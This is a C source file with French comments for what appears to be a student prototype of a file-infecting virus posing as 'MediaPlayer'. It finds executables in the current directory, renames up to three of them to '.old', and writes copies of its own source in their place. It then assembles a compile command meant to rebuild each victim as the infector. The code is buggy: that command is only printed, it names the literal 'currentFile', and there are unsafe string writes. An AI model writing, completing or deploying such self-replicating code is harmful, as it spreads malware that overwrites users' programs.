#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

bool dejaInfecte(char* nomFichier)
{
	char * extension = ".old";
	if(strstr(nomFichier, extension)){ //Si contient l'extension .old --> Déjà infecté
		return true;
	}else{
		DIR *rep = opendir("."); 
		struct dirent *lecture;
		while ((lecture = readdir(rep))) { //On verifie dans le repertoire, s'il y a déjà un .old 
			if((strcmp(lecture->d_name,nomFichier) == 0) && fopen(strcat(lecture->d_name,extension),"r")!=NULL){
				return true;
			}
		}
	}
	return false;
}

char** searchFiles()
{
	char** files = malloc(3*sizeof(char*));
	int cpt=0;
	DIR *rep = opendir("."); //Repertoire couranthttps://stackoverflow.com/questions/17766754/how-to-compare-a-char
	struct stat buf;
	struct dirent *lecture;
	printf("fichier(s) executable(s) :\n");
	while ((lecture = readdir(rep))) { //Contenu du repertoire
		stat(lecture->d_name,&buf);
		if(((buf.st_mode & S_IFMT) == S_IFREG) && (buf.st_mode & S_IXUSR))
		{ //si fichier régu && executable
			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer.exe")!=0 && !dejaInfecte(lecture->d_name)) 
			{//On ne prend que 3 fichier (lutter contre la sur-infection), et pas le premier hôte
				printf("  - %s\n", lecture->d_name);
				files[cpt] = lecture->d_name;
				cpt+=1;
			}
		}
        }
	return files;
	closedir(rep);
}

void infecte(char** files)
{
	for(int i=0;i<3;i+=1){
		FILE *newFile;
		FILE *oldFile;
		char charFile;
		char x[strlen(files[i])+strlen(".old")+1];
		char currentFile[strlen(files[i])+1];
		strcpy(currentFile,files[i]);
		strcpy(x,files[i]);
		strcat(x,".old");
		rename(files[i],x);
		printf("%s\n",x);
		oldFile = fopen("MediaPlayer.c","r");
		newFile = fopen(strcat(files[i],".c"),"w");
		while((charFile = fgetc(oldFile)) != EOF)
		{
			fputc(charFile,newFile);	
		}
		char commande[strlen("cc -Wall ")+strlen(files[i])+strlen(" -o ")+strlen(currentFile)+3];
		strcpy(commande,"cc -Wall ");
		strcat(commande,files[i]);
		strcat(commande," -o ");
		strcat(commande,"currentFile");
		printf("bblblblblblblbl %s\n", commande);
		fclose(newFile);
		fclose(oldFile);
	}
}


int main()
{
	char** f = searchFiles();
	infecte(f);
	
}
